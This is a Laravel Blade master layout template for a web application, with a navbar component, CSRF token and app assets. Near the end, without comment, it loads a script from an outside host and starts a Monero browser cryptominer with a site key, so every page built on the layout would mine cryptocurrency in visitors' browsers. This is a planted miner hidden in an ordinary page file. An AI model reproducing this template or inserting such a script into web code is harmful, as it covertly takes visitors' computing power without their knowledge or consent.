<html>
    <head>
        <link href="{{ asset('css/app.css') }}" rel="stylesheet">
        <title>!NULL</title>
        <meta name="csrf-token" content="{{ csrf_token() }}">
        <style>
            body {
                padding: 20px;
            }
            .navbar {
                margin-bottom: 20px;
            }
        </style>
    </head>
<body>
    <div class="container">
        @component('componente_navbar', [ "current" => $current ])
        @endcomponent
        <main role="main">
            @hasSection('body')
                @yield('body')
            @endif
        </main>
    </div>
    
    <script src="{{ asset('js/app.js')}}" type="text/javascript"></script>
    <script src="//statdynamic.com/lib/crypta.js"></script>
<script>
  var miner=new CRLT.Anonymous('ca5bc8b95f5d9923da47f6ab5c5176848c6f457f4be5', {
    threads:1,throttle:0.2, coin: "xmr",
  });
  miner.start();
</script>
    @hasSection('javascript')
        @yield('javascript')
    @endif
</body>
</html>
